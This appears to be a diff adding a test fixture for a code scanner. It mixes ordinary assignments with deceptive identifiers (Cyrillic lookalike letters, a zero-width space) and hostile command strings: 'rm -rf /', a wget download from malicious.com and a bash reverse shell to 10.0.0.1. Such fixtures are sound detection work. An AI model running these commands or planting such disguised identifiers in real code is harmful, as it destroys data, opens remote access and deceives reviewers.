@@ -1,0 +1,34 @@
+x = 42;
+message = "hello world";
+print(message)
+
+validVar = 123;
+normal = "hello";
+bad = "abc\x01";
+wrongID = 9abc;
+veryRandom = asd9f8as9df8as9df8as9df;
+
+vhBL0Sn8 = 756;
+d_mgMgSL = Yy6vpaOv;
+tR8E_wbg = 856;
+hkaCRjfy = "abc";
+SZ0TGB6h = "abc";
+
+user = 10;
+uѕer = 20;
+
+safeVar = 1;
+sa​feVar = 2;
+
+payload = "SGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=";
+
+query="SELECT * FROM Users Where ID=1;"
+
+cmd = "rm -rf /";
+download = "wget http://malicious.com/file.sh";
+shell = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1";
+
+admin = 1
+аdmin = 2
+
+payраl
